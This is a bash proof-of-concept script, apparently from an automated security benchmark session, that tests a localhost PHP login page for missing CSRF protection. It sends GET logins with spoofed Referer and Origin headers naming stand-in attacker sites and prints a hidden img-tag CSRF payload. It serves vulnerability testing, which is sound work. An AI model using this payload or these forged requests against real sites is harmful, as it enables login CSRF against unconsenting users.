#!/bin/bash
# POC: Demonstrates missing CSRF protection by submitting authentication requests with spoofed Referer headers from different origins
# Target: ./repo
# Created: 2025-10-31T17:22:06.319Z
# Session: benchmark-XBEN-055-24-mhf2us8d

TARGET="http://localhost:3000/index.php"
echo "=========================================="
echo "CSRF Protection Testing"
echo "=========================================="
echo ""

# Test 1: Check for CSRF tokens in the login form
echo "[Test 1] Checking for CSRF tokens in login form..."
echo "Command: curl -s $TARGET | grep -iE 'csrf|token|nonce|hidden'"
CSRF_CHECK=$(curl -s "$TARGET" | grep -iE 'csrf|token|nonce' | grep -v 'password')
if [ -z "$CSRF_CHECK" ]; then
    echo "✗ RESULT: No CSRF tokens found in login form"
    echo ""
else
    echo "✓ RESULT: CSRF tokens found:"
    echo "$CSRF_CHECK"
    echo ""
fi

# Test 2: Submit authentication request with malicious Referer header
echo "[Test 2] Testing cross-origin authentication request..."
echo "Simulating CSRF attack from malicious site: http://evil-attacker.com"
echo "Command: curl -s -H 'Referer: http://evil-attacker.com/attack.html' '$TARGET?username=admin&password=test123'"
echo ""
RESPONSE=$(curl -s -H "Referer: http://evil-attacker.com/attack.html" "$TARGET?username=admin&password=test123")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Referer: http://evil-attacker.com/attack.html" "$TARGET?username=admin&password=test123")

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✗ VULNERABILITY: Server accepts request from external origin"
    echo "   Expected: 403 Forbidden or CSRF validation error"
    echo "   Actual: Request processed normally (HTTP 200)"
else
    echo "✓ SECURE: Server rejected cross-origin request"
fi
echo ""

# Test 3: Submit authentication with missing Origin header
echo "[Test 3] Testing authentication without Origin header..."
echo "Command: curl -s '$TARGET?username=attacker&password=attackpass'"
NO_ORIGIN_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?username=attacker&password=attackpass")
echo "HTTP Status: $NO_ORIGIN_CODE"
if [ "$NO_ORIGIN_CODE" = "200" ]; then
    echo "✗ VULNERABILITY: Server processes requests without origin validation"
else
    echo "✓ SECURE: Server requires origin validation"
fi
echo ""

# Test 4: Test if authentication works with spoofed Origin
echo "[Test 4] Testing with spoofed Origin header..."
echo "Command: curl -s -H 'Origin: http://malicious-site.com' '$TARGET?username=victim&password=pass'"
SPOOFED_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: http://malicious-site.com" "$TARGET?username=victim&password=pass")
echo "HTTP Status: $SPOOFED_CODE"
if [ "$SPOOFED_CODE" = "200" ]; then
    echo "✗ VULNERABILITY: Server accepts requests with spoofed Origin header"
else
    echo "✓ SECURE: Server validates Origin header"
fi
echo ""

# Test 5: Demonstrate CSRF attack scenario
echo "[Test 5] Simulating complete CSRF attack scenario..."
echo "Attack Vector: Attacker tricks victim into visiting malicious page"
echo "Malicious HTML would contain:"
echo '  <img src="http://localhost:3000/index.php?username=attacker&password=malicious" style="display:none">'
echo ""
echo "Testing if such a request would be accepted..."
ATTACK_RESPONSE=$(curl -s -H "Referer: http://attacker-controlled-site.com/csrf.html" \
  -H "Origin: http://attacker-controlled-site.com" \
  "$TARGET?username=csrftest&password=csrfpass")
ATTACK_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -H "Referer: http://attacker-controlled-site.com/csrf.html" \
  -H "Origin: http://attacker-controlled-site.com" \
  "$TARGET?username=csrftest&password=csrfpass")

echo "HTTP Status: $ATTACK_CODE"
if [ "$ATTACK_CODE" = "200" ]; then
    echo "✗ CRITICAL: CSRF attack would succeed!"
    echo "   The application processed a cross-site authentication request"
    echo "   without any CSRF protection mechanisms"
else
    echo "✓ SECURE: CSRF attack blocked"
fi
echo ""

# Summary
echo "=========================================="
echo "SUMMARY: CSRF Protection Analysis"
echo "=========================================="
echo ""
echo "Vulnerabilities Identified:"
echo "1. No CSRF tokens in login form"
echo "2. No validation of Referer header"
echo "3. No validation of Origin header"
echo "4. Accepts cross-origin authentication requests"
echo "5. GET method makes CSRF trivial (auto-submitted by browsers)"
echo ""
echo "Impact: Attackers can force victims to submit authentication"
echo "requests by embedding malicious links/images in web pages"
echo ""
echo "Recommendation: Implement CSRF tokens and switch to POST method"